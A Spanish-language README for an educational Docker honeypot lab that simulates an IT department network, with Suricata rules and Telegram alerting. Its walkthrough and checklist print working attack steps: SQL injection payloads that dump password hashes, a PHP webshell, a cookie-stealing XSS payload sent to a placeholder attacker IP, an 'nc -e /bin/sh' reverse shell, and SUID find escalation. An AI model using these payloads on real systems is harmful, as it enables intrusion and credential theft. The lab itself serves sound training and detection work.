# TechCorp IT Honeypot — Laboratorio de seguridad educativo

Un honeypot multi-contenedor en Docker que simula la red interna de un departamento de TI ficticio. Está pensado para practicar pentesting, preparar CTFs y entender cómo se encadenan ataques reales en entornos corporativos.

---

## Índice

1. [Arquitectura](#1-arquitectura)
2. [Diagrama de red](#2-diagrama-de-red)
3. [Servicios y vulnerabilidades](#3-servicios-y-vulnerabilidades)
4. [Despliegue](#4-despliegue)
5. [Configuración](#5-configuración)
6. [Monitorización y logs](#6-monitorización-y-logs)
7. [Cadena de ataque (walkthrough)](#7-cadena-de-ataque-walkthrough)
8. [Troubleshooting](#8-troubleshooting)
9. [Checklist de validación](#9-checklist-de-validación)
10. [Registro de cambios](#10-registro-de-cambios)

---

## 1. Arquitectura

El lab tiene cinco contenedores en una red bridge aislada de Docker (`172.28.0.0/24`). Desde fuera solo se puede llegar al gateway directamente; el resto de servicios solo son accesibles por dentro, lo que obliga a pasar por el túnel SSH, igual que en una red corporativa real.

| Contenedor | Imagen base | Función | Dirección interna |
|---|---|---|---|
| `honeypot-gateway` | ubuntu:22.04 | Entry point SSH + SMB | 172.28.0.x (DHCP) |
| `glpi-web` | php:7.3-apache | Plataforma GLPI (IT management) | 172.28.0.x |
| `glpi-db` | mysql:5.7 | Base de datos MySQL | 172.28.0.x |
| `iot-vuln` | node:18-slim | Dashboard IoT/HVAC vulnerable | 172.28.0.x |
| `suricata` | python:3.12-slim | IDS de red + alertas Telegram | comparte la del gateway (sin IP propia) |

### Decisiones de diseño

- **Un solo entry point externo.** Solo el gateway tiene puertos expuestos al host. Esto fuerza al atacante a encontrar el patrón de SSH tunneling, que es exactamente lo que pasa en entornos reales.
- **Credenciales como cebo en el share SMB.** El recurso compartido tiene una estructura de carpetas realista de un departamento TI, con un `remote_access.txt` que contiene las credenciales SSH y el comando exacto para montar el túnel.
- **Suricata en modo IDS pasivo, compartiendo la red del gateway.** Suricata usa `network_mode: "service:gateway"` en vez de conectarse a `honeypot_net` con su propia IP: en una bridge Docker normal, el switch deja de reenviar tráfico unicast entre otros dos contenedores al puerto de un tercero en cuanto aprende las MACs, así que un Suricata "independiente" queda ciego ante el tráfico real casi de inmediato. Compartiendo la pila de red del gateway, ve tanto el SSH/SMB entrante como las conexiones que `sshd` reenvía por el túnel `-L` hacia GLPI e IoT.
- **Monitores Python por contenedor.** Cada contenedor corre un daemon ligero que lee sus propios logs y reenvía los eventos relevantes a Telegram en tiempo real.

---

## 2. Diagrama de red

```
 ┌──────────────────────────────────────────────────────────────┐
 │                        HOST (tu máquina)                     │
 │                                                              │
 │   ssh -p 2223 ituser@localhost                               │
 │   smbclient //localhost:1445/IT_Department -N                │
 └──────────────────────┬───────────────────────────────────────┘
                        │ :2223/tcp  SSH
                        │ :1445/tcp  SMB
                        │ :1139/tcp  NetBIOS
           ┌────────────▼────────────┐
           │    honeypot-gateway     │  ubuntu:22.04
           │    SSH  (22/tcp)        │  creds: ituser / honeypot123
           │    Samba (445/tcp)      │         gateway / honeypot123
           └────────────┬────────────┘
                        │
        ────────────────┼──────────────────────────────────────
              Docker bridge  172.28.0.0/24  (honeypot_net)
        ────────────────┼──────────────────────────────────────
               ┌────────┼────────────────────┐
               │        │                    │
      ┌────────▼──┐  ┌───▼──────────┐  ┌────▼───────┐
      │  glpi-web │  │  iot-vuln    │  │  suricata  │
      │  :80      │  │  :5000       │  │  (pasivo)  │
      └────────┬──┘  └──────────────┘  └────────────┘
               │
      ┌────────▼──┐
      │  glpi-db  │
      │  :3306    │
      └───────────┘

Túnel SSH del atacante:
  ssh -p 2223 -L 8081:glpi-web:80 -L 8082:iot-vuln:5000 ituser@<host>
  → http://localhost:8081   GLPI
  → http://localhost:8082   Dashboard IoT / HVAC
```

---

## 3. Servicios y vulnerabilidades

### 3.1 Gateway — SSH + SMB

**Puertos expuestos en el host:** `2223` (SSH), `1445` (SMB), `1139` (NetBIOS)

**Credenciales SSH**

| Usuario | Contraseña |
|---|---|
| `ituser` | `honeypot123` |
| `gateway` | `honeypot123` |

El login de root está desactivado. Autenticación por contraseña habilitada.

**Estructura del share SMB**

El recurso `IT_Department` es accesible de forma anónima (sin usuario ni contraseña) y tiene esta estructura:

```
IT_Department/
├── README.txt
├── Documentation/
│   ├── IT_Onboarding_Checklist.txt
│   ├── Network_Runbook.txt
│   └── Password_Reset_Procedure.txt
├── Infrastructure/
│   ├── Network/
│   │   ├── VLAN_Inventory.txt
│   │   └── WiFi_Credentials.txt        ← credenciales cebo
│   └── Servers/
│       └── Server_Inventory.txt
├── Security/
│   ├── Policies/
│   │   └── Information_Security_Policy.txt
│   └── Credentials/
│       └── remote_access.txt           ← cebo principal: creds SSH + comando de túnel
├── Scripts/
│   ├── Maintenance/
│   │   └── tunnel.sh                   ← script de túnel SSH (cebo)
│   └── Deployment/
│       └── README.txt
├── Software/Licenses/Software_Licenses.txt
├── Helpdesk/Templates/Password_Reset_Request.txt
└── Projects/Onboarding/New_Employee_Template.txt
```

Los ficheros `remote_access.txt` y `tunnel.sh` contienen las credenciales SSH y el comando exacto para hacer port-forwarding hacia GLPI y el IoT.

---

### 3.2 GLPI — Servidor web

**URL interna (vía túnel):** `http://localhost:8081`

**Credenciales por defecto de GLPI**

| Usuario | Contraseña | Perfil |
|---|---|---|
| `glpi` | `glpi` | Super-admin |
| `normal` | `normal` | Usuario normal |
| `tech` | `tech` | Técnico |
| `post-only` | `postonly` | Self-service |

**Vulnerabilidades intencionadas**

| Vulnerabilidad | Ubicación | Descripción |
|---|---|---|
| Stored XSS | Campo "Descripción" de un ticket | TinyMCE bloquea la etiqueta `<script>` y los manejadores de ratón/teclado más comunes, pero **no filtra `onerror`/`onload`**; un payload tipo `<img src=x onerror="...">` en la descripción se guarda y ejecuta cuando cualquier usuario abre el ticket. El título del ticket, en cambio, siempre se escapa — no es un vector válido |
| SQL Injection | `/front/user_search.php` | `$_GET['search']` se mete directamente en la query SQL sin escapar ni sanitizar |
| Subida de ficheros sin restricciones | `/front/upload_attachment.php` | Sin validación de extensión ni MIME; los `.php` subidos a `/files/uploads/` los ejecuta Apache |
| Debug SQL activo | `config_db_slave.php` | `DEBUG_SQL = true` muestra los errores MySQL crudos al navegador |
| phpinfo() plantado | `/files/PHP/01/2ee2…f55554.PHP` | Fichero pre-plantado que simula un compromiso previo |

---

### 3.3 IoT — Dashboard HVAC

**URL interna (vía túnel):** `http://localhost:8082`

App Node.js/Express que simula el controlador de climatización de un edificio (Building Management System). Tiene panel con zonas, gauge de temperatura, modos de operación y log de alarmas.

**Vulnerabilidades intencionadas**

| Vulnerabilidad | Endpoint | Descripción |
|---|---|---|
| Remote Code Execution (RCE) | `POST /set` | El parámetro `value` se pasa directamente a `child_process.exec()` sin ningún tipo de sanitización |
| Escalada de privilegios | `/usr/bin/find` (SUID) | El bit SUID está activado en `find`; permite a `www-data` escalar a root |

---

### 3.4 Suricata IDS

Suricata corre en modo IDS pasivo AF_PACKET, **compartiendo la interfaz de red del contenedor `gateway`** (ver [10. Registro de cambios](#10-registro-de-cambios) para el porqué). Escribe logs en `/var/log/suricata/eve.json`. El daemon `telegram_alerts.py` agrupa las alertas y manda un resumen a Telegram cuando se detectan 5 o más en una ventana de 10 segundos; las firmas de alta severidad (fuerza bruta, sqlmap, Nmap, Nikto, Gobuster) además avisan **al instante**, sin esperar ese umbral.

**Reglas personalizadas** (en `compose/suricata/rules/suricata.rules`, 35 reglas en total)

| Rango SID | Detecta |
|---|---|
| 1000001–1000003 | TCP/UDP/ICMP genérico hacia los servicios del honeypot |
| 1000010 | Conexiones SSH |
| 1000020–1000021 | Conexiones SMB / NetBIOS |
| 1000030–1000039 | HTTP hacia GLPI: XSS, SQLi, file upload, directory traversal, login |
| 1000050–1000054 | IoT: conexiones al puerto 5000, POST /set, keywords de reverse shell en el body |
| 1000060 | TCP saliente desde la subred del honeypot a un puerto no estándar (callback de reverse shell; se excluyen 80/443 para no confundir el tráfico legítimo de los propios monitores hacia Telegram) |
| 1000070 | SYN scan (más de 10 SYNs en 5 s desde la misma IP origen) |
| 1000071–1000073 | Escaneos sigilosos de Nmap: NULL scan, FIN scan, XMAS scan |
| 1000074–1000077 | Fingerprint por User-Agent de herramientas automatizadas: Nmap NSE, **sqlmap**, Nikto, Gobuster |
| 1000078 | SQLi ciega basada en tiempo (`SLEEP()`/`BENCHMARK()`) |
| 1000080 | **Fuerza bruta SSH** (> 5 intentos de conexión en 60 s desde el mismo origen) |
| 1000081 | **Fuerza bruta de login GLPI** (> 5 POST a `login.php` en 30 s) |
| 1000082 | **Fuerza bruta / fuzzing automatizado** contra `POST /set` del IoT (> 5 en 15 s) |
| 1000083 | **Fuerza bruta / enumeración SMB** (> 5 intentos de conexión en 30 s) |

---

## 4. Despliegue

### Requisitos previos

- Docker Engine ≥ 20.10
- Docker Compose ≥ 1.29 (o el plugin `docker compose` v2)
- Acceso a internet desde el host (para las descargas de imágenes y la API de Telegram)

### Primer build y arranque

```bash
cd Docker_Honeypot/deployments

# Construir todas las imágenes y arrancar en background
docker compose up --build -d
```

En el primer arranque GLPI tarda unos 30 segundos mientras MySQL se inicializa. Si ves un error de conexión a la BD al abrir el navegador, espera un momento y recarga.

### Operaciones habituales

```bash
# Ver el estado de los contenedores
docker compose ps

# Seguir los logs de todos los servicios
docker compose logs -f

# Reiniciar solo un servicio
docker compose restart web

# Parar todo (los datos de MySQL se conservan en el volumen)
docker compose down

# Parar todo y borrar también el volumen de la BD
docker compose down -v

# Reconstruir solo una imagen después de cambiar código
docker compose build web
docker compose up -d web
```

### Verificar que todo funciona

```bash
# 1. El share SMB es accesible de forma anónima
smbclient //localhost:1445/IT_Department -N -c "ls"

# 2. El gateway SSH responde
ssh -p 2223 ituser@localhost   # contraseña: honeypot123

# 3. Montar el túnel y probar los servicios internos
ssh -p 2223 -L 8081:glpi-web:80 -L 8082:iot-vuln:5000 ituser@localhost &
curl -s -o /dev/null -w "%{http_code}" http://localhost:8081   # → 200
curl -s http://localhost:8082/temperature                       # → {"temperature":21}

# 4. Suricata está capturando tráfico
docker exec -it suricata tail -5 /var/log/suricata/suricata.log
# No debe aparecer "failed to create AF_PACKET socket"
```

---

## 5. Configuración

### Bot de Telegram

Todos los monitores usan el mismo bot. Si quieres cambiar las credenciales, actualiza las variables en estos cuatro ficheros:

| Fichero | Variable del token | Variable del chat ID |
|---|---|---|
| `compose/gateway/monitor_gateway.py` | `TELEGRAM_TOKEN` | `CHAT_ID` |
| `compose/iot/monitor_iot.py` | `TELEGRAM_TOKEN` | `CHAT_ID` |
| `compose/suricata/telegram_alerts.py` | `TELEGRAM_BOT_TOKEN` | `TELEGRAM_CHAT_ID` |
| `compose/webserver/monitor_webserver.py` | `TELEGRAM_TOKEN` | `CHAT_ID` |

Para crear un bot nuevo: abre `@BotFather` en Telegram → `/newbot`. Para obtener el chat ID: manda un mensaje al bot y luego consulta `https://api.telegram.org/bot<TOKEN>/getUpdates`.

### Credenciales MySQL

Definidas en `deployments/docker-compose.yaml` bajo el servicio `db`:

| Parámetro | Valor |
|---|---|
| Root password | `root` |
| Base de datos | `glpi` |
| Usuario/contraseña de la app | `glpi` / `glpi` |

### HOME_NET de Suricata

Definida en `compose/suricata/suricata.yaml`:
```yaml
HOME_NET: "[192.168.0.0/16,10.0.0.0/8,172.28.0.0/12]"
```
Ya cubre la subred del bridge por defecto. Solo hace falta tocarlo si cambias la `subnet` en `docker-compose.yaml`.

### Zona horaria

El contenedor `glpi-web` usa `TZ: Europe/Madrid`. Cámbialo en el bloque `environment` del servicio `web` dentro de `docker-compose.yaml`.

---

## 6. Monitorización y logs

### Referencia de alertas Telegram

| Emoji | Contenedor | Evento |
|---|---|---|
| 🔴 | Gateway | Intento SSH fallido (contraseña incorrecta) |
| 🟢 | Gateway | Login SSH exitoso |
| ⚪ | Gateway | Sesión SSH desconectada |
| 📂 | Gateway | Acceso SMB a un fichero cebo (tunnel.sh, remote_access.txt, WiFi_Credentials.txt…) |
| 🟢 | GLPI | Nueva sesión PHP (alguien se ha logado en GLPI) |
| 🎫 | GLPI | Ticket nuevo creado (se reenvía título y contenido) |
| 💉 | GLPI | Patrón de SQL injection en la URI de la request |
| 🔑 | GLPI | POST a `login.php` |
| 📤 | GLPI | Subida de fichero vía `upload_attachment.php` |
| 🚨 | GLPI | Acceso a un `.php` en `/files/uploads/` (ejecución de webshell) |
| 🔍 | GLPI | Acceso a `user_search.php` (vector SQLi) |
| 🔔 | IoT | Reverse shell establecida (socket ESTABLISHED + `nc`/`bash` en el cmdline, proceso de `www-data`) |
| 🔺 | IoT | Escalada de privilegios: shell de root con `/usr/bin/find` en el árbol de procesos |
| ⚠️ | Suricata | ≥ 5 alertas de Suricata en 10 segundos (resumen agrupado) |

### Ubicación de los logs dentro de los contenedores

| Contenedor | Ruta del log | Contenido |
|---|---|---|
| `honeypot-gateway` | `/var/log/ssh/sshd.log` | Eventos del daemon SSH |
| `honeypot-gateway` | `/var/log/samba/log.gateway` | Log de acceso a ficheros Samba |
| `glpi-web` | `/var/log/apache2/access.log` | Access log de Apache (Combined Log Format) |
| `glpi-web` | `/var/www/html/files/_log/event.log` | Eventos de la aplicación GLPI |
| `glpi-web` | `/var/www/html/files/_log/sql-errors.log` | Errores SQL de GLPI |
| `suricata` | `/var/log/suricata/eve.json` | EVE JSON de Suricata (todos los eventos) |
| `suricata` | `/var/log/suricata/fast.log` | Alertas en formato de una línea |
| `suricata` | `/var/log/suricata/suricata.log` | Arranque y errores del motor |

El directorio `compose/suricata/log/` está montado como bind mount desde el host, así que los logs de Suricata son accesibles directamente sin necesidad de hacer `docker exec`.

### Ver alertas de Suricata en tiempo real

```bash
# Formato legible, solo alertas
docker exec -it suricata tail -f /var/log/suricata/eve.json \
  | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        if d.get('event_type') == 'alert':
            print(d['timestamp'], d['alert']['signature'])
    except: pass
"

# Fast log (una línea por alerta)
docker exec -it suricata tail -f /var/log/suricata/fast.log

# Directamente desde el host (bind mount)
tail -f Docker_Honeypot/compose/suricata/log/fast.log
```

---

## 7. Cadena de ataque (walkthrough)

Esta sección describe la cadena de ataque completa que el lab está diseñado para demostrar. Cada paso conecta con el siguiente de forma natural, igual que lo haría un atacante real.

---

### Paso 1 — Reconocimiento: escaneo de puertos

El atacante empieza sin saber nada. Lo primero es descubrir qué servicios están expuestos.

```bash
nmap -sV -p 2223,1445,1139,80,5000 <IP_HOST>
```

**Resultado esperado:**
```
2223/tcp  open  ssh     OpenSSH 8.x
1139/tcp  open  netbios-ssn  Samba
1445/tcp  open  microsoft-ds Samba
```

GLPI y el IoT no son accesibles desde fuera, así que de momento solo ve el gateway.

**Detección:** Suricata activa la regla de SYN scan (SID 1000070) si el escaneo supera 10 SYN en 5 segundos → alerta ⚠️ en Telegram.

---

### Paso 2 — Enumeración SMB: encontrar las credenciales

El puerto SMB abierto y accesible de forma anónima es una señal clara para un pentester. Lo primero es listar el share.

```bash
# Listar el share anónimamente
smbclient //localhost/IT_Department -p 1445 -N -c "ls"

# Navegar y descargar el fichero de credenciales
smbclient //localhost/IT_Department -p 1445 -N \
  -c "get Security/Credentials/remote_access.txt /tmp/remote_access.txt"

cat /tmp/remote_access.txt
```

El fichero revela las credenciales SSH (`ituser / honeypot123`) y el comando exacto para montar el túnel hacia los servicios internos.

**Detección:** `monitor_gateway.py` detecta el acceso a `remote_access.txt` en el log de Samba → alerta 📂 en Telegram.

---

### Paso 3 — Acceso SSH y túnel hacia los servicios internos

Con las credenciales en la mano, el siguiente paso es entrar por SSH y abrir un túnel hacia GLPI y el IoT.

```bash
# Login básico (para explorar la máquina)
ssh -p 2223 ituser@localhost
# contraseña: honeypot123

# Túnel hacia los servicios internos (en una sesión separada)
ssh -p 2223 \
  -L 8081:glpi-web:80 \
  -L 8082:iot-vuln:5000 \
  ituser@localhost
```

Después del túnel:
- `http://localhost:8081` → GLPI
- `http://localhost:8082` → Dashboard IoT/HVAC

**Detección:** `monitor_gateway.py` detecta el login en `sshd.log` → alerta 🟢 en Telegram.

---

### Paso 4 — Explotación de GLPI

Con el túnel activo, el atacante tiene acceso a la aplicación web. Hay varios vectores.

#### 4a. SQL Injection en user_search.php

La consulta selecciona **4 columnas** (`name, realname, firstname, password`), así que los payloads UNION tienen que proporcionar exactamente 4 valores **en ese orden** para que se muestren en las columnas correctas (Login / Nombre / Apellido / Hash de contraseña).

```
URL base: http://localhost:8081/front/user_search.php

# Confirmar la inyección (provoca un error SQL visible)
?search='

# Fingerprint de la base de datos
?search=' UNION SELECT 1,user(),version(),@@datadir-- -

# Volcar todos los usuarios y sus hashes de contraseña
?search=' UNION SELECT name,realname,firstname,password FROM glpi_users-- -

# Leer ficheros del sistema (requiere el privilegio FILE en MySQL)
?search=' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
```

**Detección:** `monitor_webserver.py` detecta el patrón `UNION SELECT` en la URI del access log → alerta 💉; Suricata SIDs 1000033–1000035.

#### 4b. Subida de fichero sin restricciones → webshell PHP

```bash
# Crear la webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Subirla (se necesita estar logado en GLPI)
curl -b "glpi_XXXXXXXXXX=<valor_de_sesion>" \
     -F "attachment[]=@/tmp/shell.php" \
     http://localhost:8081/front/upload_attachment.php

# Ejecutar comandos a través de la webshell
curl "http://localhost:8081/files/uploads/shell.php?cmd=id"
# → uid=33(www-data) gid=33(www-data)

curl "http://localhost:8081/files/uploads/shell.php?cmd=cat+/etc/passwd"
```

**Detección:** `monitor_webserver.py` → alerta 📤 al subir, alerta 🚨 al ejecutar la webshell; Suricata SIDs 1000036, 1000037.

#### 4c. Stored XSS → robo de sesión

El editor de texto enriquecido (TinyMCE) que usa el campo **Descripción** de un ticket filtra la etiqueta `<script>` y los manejadores de ratón/teclado más comunes (`onclick`, `onmouseover`, etc.), pero **no filtra `onerror` ni `onload`** — el bypass clásico de blocklist incompleta. El título del ticket, en cambio, siempre se escapa al mostrarse, así que **no** es un vector válido; hay que usar el campo Descripción.

```
1. Logarse en GLPI como tech / tech (o cualquier perfil que pueda crear tickets)
2. Crear un ticket nuevo
3. En el campo "Descripción" (NO en el título) poner:
       <img src=x onerror="fetch('http://IP_ATACANTE/?c='+document.cookie)">
4. Guardar el ticket
5. Cuando cualquier usuario (incluido un admin) abre el ticket, la imagen
   rota dispara onerror y el script se ejecuta, mandando la cookie al atacante
6. Usar esa cookie para secuestrar la sesión del admin
```

Vía API, sin pasar por el editor:

```bash
curl -s -b cookies.txt -X POST http://localhost:8081/front/ticket.form.php \
  --data-urlencode "_glpi_csrf_token=$CSRF" \
  --data-urlencode "name=Reporte de incidencia" \
  --data-urlencode 'content=<img src=x onerror="fetch(String.fromCharCode(104,116,116,112)+String.fromCharCode(58,47,47)+location.hostname+String.fromCharCode(47,63,99,61)+document.cookie)">' \
  --data-urlencode "add=Add"
```

**Detección:** `monitor_webserver.py` reenvía el contenido del ticket a Telegram → alerta 🎫, y además dispara una alerta 🕸️ específica de XSS al detectar el patrón `onerror=`/`onload=`/`<script` en el título o el contenido; Suricata SID 1000032 (patrón `<script`, cubre el caso clásico, no el bypass `onerror`).

---

### Paso 5 — Explotación del IoT: RCE y escalada de privilegios

#### 5a. Remote Code Execution vía POST /set

El endpoint `POST /set` pasa el valor recibido directamente a `child_process.exec()` sin ningún tipo de validación. Cualquier cosa que mandes se ejecuta en el sistema operativo.

```bash
# Verificar RCE (el output del comando no aparece en la respuesta HTTP,
# pero el servidor sí lo ejecuta)
curl -X POST http://localhost:8082/set \
  -H "Content-Type: application/json" \
  -d '{"value":"id > /tmp/pwned"}'

# Establecer una reverse shell
# Primero, escuchar en la máquina del atacante:
nc -lvnp 4444

# Después, mandar el payload al IoT:
curl -X POST http://localhost:8082/set \
  -H "Content-Type: application/json" \
  -d '{"value":"nc <IP_ATACANTE> 4444 -e /bin/sh"}'
```

Con esto se obtiene una shell como `www-data` en el contenedor IoT.

**Detección:** `monitor_iot.py` detecta el proceso `nc` con socket en estado ESTABLISHED → alerta 🔔; Suricata SIDs 1000051, 1000052, 1000060.

#### 5b. Escalada de privilegios vía SUID en find

Desde la shell de `www-data` obtenida en el paso anterior:

```bash
# Verificar que find tiene el bit SUID
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root ... /usr/bin/find

# Escalar a root
/usr/bin/find . -exec /bin/sh -p \; -quit

# Comprobar
id
# uid=33(www-data) gid=33(www-data) euid=0(root)
```

La opción `-p` de `sh` mantiene el EUID efectivo (root) en lugar de rebajarlo al UID real.

**Detección:** `monitor_iot.py` detecta una shell con EUID=0 cuyo árbol de procesos contiene `/usr/bin/find` → alerta 🔺 en Telegram.

---

### Resumen de la cadena completa

```
[Nmap scan]
    ↓ SYN scan detectado por Suricata
[SMB anónimo → remote_access.txt]
    ↓ Acceso a fichero cebo detectado por monitor_gateway.py
[SSH login con ituser/honeypot123]
    ↓ Login exitoso detectado por monitor_gateway.py
[Túnel SSH → GLPI y IoT accesibles]
[SQLi en GLPI → hashes de contraseñas]
    ↓ Detectado por monitor_webserver.py + Suricata
[File upload → webshell PHP en GLPI]
    ↓ Detectado por monitor_webserver.py + Suricata
[RCE en IoT → reverse shell como www-data]
    ↓ Detectado por monitor_iot.py + Suricata
[SUID find → escalada a root]
    ↓ Detectado por monitor_iot.py
```

---

## 8. Troubleshooting

### Suricata — `failed to create AF_PACKET socket: Operation not permitted`

**Causa:** Al contenedor le faltan las Linux capabilities `NET_ADMIN` y `NET_RAW`.

**Solución (ya aplicada):** El `docker-compose.yaml` incluye:
```yaml
cap_add:
  - NET_ADMIN
  - NET_RAW
  - SYS_NICE
```
Si el error persiste, comprueba que Docker no está corriendo en modo rootless (los sockets raw requieren configuración adicional en ese modo).

```bash
# Verificar que Suricata corre como root y tiene las capabilities
docker exec -it suricata id
docker exec -it suricata capsh --print | grep cap_net
```

---

### GLPI — "Error connecting to the database" al abrir por primera vez

MySQL tarda entre 20 y 40 segundos en inicializarse. Espera y recarga. Si persiste:

```bash
docker compose restart web

# Si sigue sin funcionar, revisar el log de MySQL
docker logs glpi-db
docker exec -it glpi-db mysql -uglpi -pglpi -e "SELECT 1"
```

---

### Las alertas de Telegram no llegan

1. Verificar que el token del bot es válido:
   ```bash
   curl "https://api.telegram.org/bot<TOKEN>/getMe"
   ```
2. Confirmar el chat ID:
   ```bash
   curl "https://api.telegram.org/bot<TOKEN>/getUpdates"
   ```
3. Comprobar que los procesos monitor están vivos:
   ```bash
   docker exec honeypot-gateway ps aux | grep monitor_gateway
   docker exec glpi-web ps aux | grep monitor_webserver
   docker exec iot-vuln ps aux | grep monitor_iot
   docker exec suricata ps aux | grep telegram_alerts
   ```
4. Verificar que el contenedor tiene acceso a internet:
   ```bash
   docker exec glpi-web curl -s https://api.telegram.org
   ```

---

### El share SMB no es accesible

```bash
# Test con smbclient
smbclient //127.0.0.1:1445/IT_Department -N -c "ls"

# En macOS: Ir → Conectar al servidor → smb://localhost:1445/IT_Department
# En Windows: \\localhost@1445\IT_Department en el Explorer

# Verificar que smbd está corriendo dentro del contenedor
docker exec honeypot-gateway ps aux | grep smbd
```

---

### El dashboard IoT no responde

```bash
docker logs iot-vuln
# Busca: "IoT device escuchando en el puerto 5000"
# Si está vacío o hay errores:
docker compose restart iot
```

---

## 9. Checklist de validación

### Infraestructura

- [ ] `docker compose ps` muestra los 5 contenedores en estado `Up`
- [ ] `smbclient //localhost:1445/IT_Department -N -c "ls"` devuelve el listado de ficheros
- [ ] `ssh -p 2223 ituser@localhost` (contraseña `honeypot123`) funciona
- [ ] `curl http://localhost:8081` (vía túnel) devuelve el login de GLPI
- [ ] `curl http://localhost:8082/temperature` (vía túnel) devuelve `{"temperature":21}`
- [ ] `docker exec -it suricata tail /var/log/suricata/suricata.log` **no** muestra `failed to create AF_PACKET socket`

### Monitorización — Telegram

- [ ] Login SSH al gateway → mensaje 🟢 en Telegram
- [ ] Descargar `remote_access.txt` vía SMB → mensaje 📂 en Telegram
- [ ] Login en GLPI → mensaje 🟢 en Telegram
- [ ] Crear un ticket en GLPI → mensaje 🎫 en Telegram; si el contenido lleva `onerror=`/`<script`, también mensaje 🕸️
- [ ] `POST /set` al IoT con un valor no numérico → mensaje 🎯 inmediato (no hace falta que la reverse shell llegue a establecerse)
- [ ] El fast.log de Suricata tiene entradas después de cualquier request HTTP **vía túnel** (Suricata comparte la red del gateway; el tráfico directo contenedor-a-contenedor que se salte el túnel no es visible para él, por diseño)
- [ ] `hydra`/fuerza bruta SSH (≥ 5 intentos en 60 s) → alerta 🚨 inmediata de Suricata (sid 1000080), sin esperar al umbral de agregación
- [ ] Alerta agrupada ⚠️ de Suricata llega después de ≥ 5 alertas en 10 s (por ejemplo: `for i in $(seq 10); do curl -s http://localhost:8081 > /dev/null; done`)

### Vulnerabilidades

- [ ] `http://localhost:8081/front/user_search.php?search='` produce un error SQL visible o registrado (y, si `config_db_slave.php` define `DEBUG_SQL=true`, un volcado del error crudo al final de la página)
- [ ] Payload UNION SELECT en `user_search.php` devuelve metadata de MySQL
- [ ] Fichero PHP subido vía `upload_attachment.php` es accesible en `/files/uploads/<nombre>.php` **y se ejecuta** (`?cmd=id` devuelve `uid=33(www-data)`, no el código fuente)
- [ ] `POST /set` al IoT con `{"value":"/usr/bin/find . -maxdepth 0 -exec /bin/sh -p -c \"id > /app/public/x.txt\" \; -quit"}` seguido de `GET /x.txt` devuelve `euid=0(root)`
- [ ] RCE en IoT: `curl -X POST http://localhost:8082/set -H "Content-Type: application/json" -d '{"value":"id"}'` devuelve respuesta sin error
- [ ] Stored XSS: ticket con `<script>alert(1)</script>` renderiza el alert al visualizarlo

---

## 10. Registro de cambios

### Fix: capabilities de Suricata (`compose/suricata/Dockerfile`, `deployments/docker-compose.yaml`)

**Problema:** Suricata corría como usuario no-root y no podía abrir sockets AF_PACKET (`Operation not permitted`), así que no inspeccionaba ningún paquete.

**Solución:** Se eliminó `USER suricata` del Dockerfile para que el proceso corra como root dentro del contenedor, y se añadió `cap_add: [NET_ADMIN, NET_RAW, SYS_NICE]` al servicio en el Compose.

---

### Fix: columnas de la query SQLi (`compose/webserver/glpi/front/user_search.php`)

**Problema:** La query original seleccionaba 5 columnas (`id, name, realname, firstname, email`) pero los payloads UNION documentados usan 4 valores. MySQL rechaza silenciosamente el UNION cuando los recuentos no coinciden, así que la inyección parecía no funcionar.

**Solución:** Se eliminó `id` de la SELECT, dejando 4 columnas (`name, realname, firstname, email`). Los payloads UNION ahora funcionan correctamente.

---

### Fix: monitor IoT corriendo como www-data (`compose/iot/Dockerfile`, `compose/iot/entrypoint.sh`)

**Problema:** La directiva `USER www-data` en el Dockerfile hacía que `monitor_iot.py` corriese como www-data, y el kernel Linux bloquea la lectura de `/proc/<pid>/fd/` de otros procesos a usuarios no-root. El monitor no detectaba nada pero tampoco daba error, fallaba en silencio.

**Solución:** Se eliminó `USER www-data` del Dockerfile. El monitor arranca como root (puede leer `/proc/<pid>/fd/` de cualquier proceso). Node.js se rebaja a `www-data` en el `entrypoint.sh` con `exec su -s /bin/sh www-data -c "exec node /app/app.js"`, preservando la superficie de ataque.

---

### Mejora: reglas de detección de Suricata (`compose/suricata/rules/suricata.rules`)

Se reemplazaron tres reglas genéricas por 71 reglas específicas organizadas en seis categorías: conectividad general, SSH, SMB, ataques HTTP a GLPI, ataques al IoT y conexiones salientes. Cada categoría cubre los vectores de ataque implementados en el lab.

---

### Mejora: fix en el timing del flush de ventana de Suricata (`compose/suricata/telegram_alerts.py`)

**Problema:** El vaciado de la ventana de alertas solo ocurría cuando llegaba una nueva línea del log *después* de que expirase la ventana. En períodos de poco tráfico la ventana nunca se vaciaba y los contadores crecían indefinidamente sin mandar ninguna alerta.

**Solución:** El check del flush ahora ocurre en cada iteración del bucle, independientemente de si llegó una línea nueva. También se añadió `wait_for_log()` para esperar con reintentos a que `eve.json` exista antes de intentar abrirlo.

---

### Mejora: dashboard IoT rediseñado (`compose/iot/public/`)

Se sustituyó la interfaz minimalista original por un dashboard de Building Management System más realista, con panel lateral de zonas (Server Room A, Network Closet B, UPS Room, Tape Library), gauge analógico con zonas de color, botones de modo (COOL/HEAT/FAN/AUTO) y log de alarmas. Los endpoints `/set` y `/temperature` no cambiaron; todas las vulnerabilidades se conservan.

---

### Mejora: estructura del share SMB (`compose/gateway/Dockerfile`, `compose/gateway/smb.conf`)

Se creó un árbol de directorios completo de departamento TI en `/srv/public/IT_Department/` con 15 ficheros de texto realistas. Los ficheros cebo principales son `Security/Credentials/remote_access.txt` (credenciales SSH + comando de túnel), `Scripts/Maintenance/tunnel.sh` (script ejecutable) e `Infrastructure/Network/WiFi_Credentials.txt`. Se añadió un symlink en `/srv/public/tunnel.sh` para que el monitor siga detectando accesos a ese path.

---

### Auditoría completa 2026-08-25: GLPI, IoT y Suricata realmente vulnerables/detectando, con prueba en vivo

Auditoría end-to-end con ataques reales contra el stack levantado con Docker (nmap, hydra, sqlmap-style requests, subida y ejecución de webshell, XSS en navegador real, RCE + reverse shell + escalada en el IoT). Se encontraron y corrigieron **11 bugs reales** que impedían que la mitad del lab funcionase tal y como lo describía este README. A continuación, cada uno con el problema, cómo se detectó y la solución.

#### 1. GLPI nunca había sido instalado (bug crítico — bloqueaba todo el módulo GLPI)

**Problema:** La base de datos `glpi` estaba completamente vacía (0 tablas). No existe ningún paso, ni en el `Dockerfile` ni en el `docker-compose.yaml`, que importe el esquema de GLPI o cree los usuarios por defecto. Cualquiera que desplegara el lab desde cero se encontraba con el asistente de instalación de GLPI en vez de la pantalla de login — ninguna de las credenciales (`glpi/glpi`, `tech/tech`...) ni vulnerabilidades documentadas estaban disponibles.

